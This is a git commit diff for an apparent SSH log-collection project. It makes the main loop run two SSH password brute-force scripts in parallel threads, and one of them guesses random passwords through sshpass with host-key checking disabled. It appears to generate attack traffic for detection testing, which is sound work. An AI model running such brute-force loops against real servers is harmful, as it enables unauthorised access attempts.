e862c050a3715b350de003e9cab5d23d695d4ab0
alexei <aleksej.mutic@gmail.com>
2026-08-15 16:27:20 +0200

    Main now calls both ssh attacks in parallel.

--- main.py
+++ main.py
@@ -1,10 +1,34 @@
 import json
+import threading
 import time
 
+from sources.ssh.attacks.brute_force import run_attack
+from sources.ssh.attacks.random_passwords_brufe_force import run_attack as run_random_attack
 from sources.ssh.ssh_collector import collect
 
 
+def brute_force_worker():
+    run_attack()
+
+
+def random_attack_worker():
+    run_random_attack()
+
+
 def main():
+
+    brute_force_thread = threading.Thread(
+        target=brute_force_worker,
+        daemon=True
+    )
+
+    random_attack_thread = threading.Thread(
+        target=random_attack_worker,
+        daemon=True
+    )
+
+    brute_force_thread.start()
+    random_attack_thread.start()
 
     while True:
 
@@ -13,9 +37,6 @@ def main():
         event = collect()
 
         print(json.dumps(event, indent=4))
-
-        # later:
-        # send_to_elasticsearch(event)
 
         time.sleep(5)
 
--- sources/ssh/attacks/random_passwords_brufe_force.py
+++ sources/ssh/attacks/random_passwords_brufe_force.py
@@ -4,27 +4,37 @@ import subprocess
 
 from config import SSH_HOST, SSH_PORT, SSH_USER
 
+
 def random_password(length=10):
     alphabet = string.ascii_letters + string.digits
     return "".join(random.choice(alphabet) for _ in range(length))
 
 
-while True:
-    password = random_password()
+def run_attack():
 
-    print(f"Trying: {password}")
+    while True:
 
-    subprocess.run(
-        [
-            "sshpass",
-            "-p", password,
-            "ssh",
-            "-p", str(SSH_PORT),
-            "-o", "StrictHostKeyChecking=no",
-            "-o", "UserKnownHostsFile=/dev/null",
-            f"{SSH_USER}@{SSH_HOST}",
-            "echo Connected"
-        ],
-        capture_output=True,
-        text=True
-    )
+        password = random_password()
+
+        print(f"Trying: {password}")
+
+        subprocess.run(
+            [
+                "sshpass",
+                "-p",
+                password,
+                "ssh",
+                "-p",
+                str(SSH_PORT),
+                "-o", "StrictHostKeyChecking=no",
+                "-o", "UserKnownHostsFile=/dev/null",
+                f"{SSH_USER}@{SSH_HOST}",
+                "echo Connected"
+            ],
+            capture_output=True,
+            text=True
+        )
+
+
+if __name__ == "__main__":
+    run_attack()
